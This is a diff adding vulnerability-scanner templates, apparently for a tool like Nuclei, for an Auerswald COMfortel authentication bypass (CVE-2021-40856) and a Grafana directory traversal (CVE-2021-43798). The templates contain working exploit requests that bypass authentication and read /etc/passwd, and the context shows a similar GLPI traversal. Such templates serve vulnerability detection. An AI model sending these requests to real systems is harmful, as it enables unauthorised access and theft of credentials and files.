@@ -39701,6 +39701,53 @@
       ]
     },
     {
+      "id": "CVE-2021-40856",
+      "info": {
+        "author": "gy741",
+        "description": "Inserting the prefix \"/about/../\" allows bypassing the authentication check for the web-based configuration management interface. This enables attackers to gain access to the login credentials used for authentication at the PBX, among other data.",
+        "name": "Auerswald COMfortel 1400/2600/3600 IP - Authentication Bypass",
+        "reference": [
+          "https://www.redteam-pentesting.de/en/advisories/rt-sa-2021-004/-auerswald-comfortel-1400-2600-3600-ip-authentication-bypass",
+          "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-40856"
+        ],
+        "severity": "medium",
+        "tags": "cve,cve2021,comfortel,auth-bypass"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "\"TYPE\"",
+                "\"ITEMS\"",
+                "\"COUNT\""
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "application/json"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "GET /about/../tree?action=get HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-40868",
       "info": {
         "author": "daffainfo",
@@ -41037,6 +41084,49 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/glpi/plugins/barcode/front/send.php?file=../../../../../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-43798",
+      "info": {
+        "author": "z0ne,dhiyaneshDk",
+        "classification": {
+          "cve-id": "CVE-2021-43798",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+          "cvss-score": 7.5
+        },
+        "description": "Grafana is an open-source platform for monitoring and observability. Grafana versions 8.0.0-beta1 through 8.3.0 (except for patched versions) iss vulnerable to directory traversal, allowing access to local files. The vulnerable URL path is `<grafana_host_url>/public/plugins//`, where is the plugin ID for any installed plugin. At no time has Grafana Cloud been vulnerable. Users are advised to upgrade to patched versions 8.0.7, 8.1.8, 8.2.7, or 8.3.1. The GitHub Security Advisory contains more information about vulnerable URL paths, mitigation, and the disclosure timeline.",
+        "name": "Grafana v8.x Arbitrary File Read",
+        "reference": [
+          "https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p",
+          "https://nosec.org/home/detail/4914.html",
+          "https://github.com/jas502n/Grafana-VulnTips"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2021,grafana,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../etc/passwd"
           ]
         }
       ]
